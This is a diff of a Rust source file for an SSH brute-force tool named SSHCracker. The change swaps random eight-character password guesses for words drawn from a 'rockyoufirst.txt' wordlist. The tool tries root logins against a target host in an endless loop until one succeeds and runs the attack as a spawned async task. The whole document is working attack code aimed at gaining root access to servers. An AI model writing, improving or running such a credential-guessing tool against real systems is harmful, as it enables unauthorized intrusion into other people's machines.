@@ -2,24 +2,27 @@ use ssh2::Session;
 use core::time;
 use std::{net::TcpStream, thread};
 use colored::Colorize;
-use rand::distr::{Alphanumeric, SampleString};
+use crate::generators::base_generator::BaseGenerator;
 
 pub struct SSHCracker {
     host: String,
-    port: u16
+    port: u16,
+    generator: BaseGenerator
 }
 
 impl SSHCracker {
     pub fn new(host: &str, port: u16) -> Self {
         SSHCracker {
             host: host.to_string(), 
-            port
+            port,
+            generator: BaseGenerator::new("rockyoufirst.txt")
         }
     }
 
-    pub fn attack(&self) {
+    pub fn attack(&mut self) {
         loop {
-            if self.check_ssh_login(self.host.as_str(), self.port, "root", Alphanumeric.sample_string(&mut rand::rng(), 8).as_str()) == true {
+            let p = self.generator.generate_word();
+            if self.check_ssh_login(self.host.as_str(), self.port, "root", p.as_str()) == true {
                 return
             }
         }
@@ -68,7 +71,7 @@ impl SSHCracker {
 pub fn create_ssh_brute_attack_handle(host: &str, port: u16) -> tokio::task::JoinHandle<()> {
     let host = host.to_string();
     tokio::spawn(async move {
-        let cracker = SSHCracker::new(host.as_str(), port);
+        let mut cracker = SSHCracker::new(host.as_str(), port);
         cracker.attack()
     })
 }
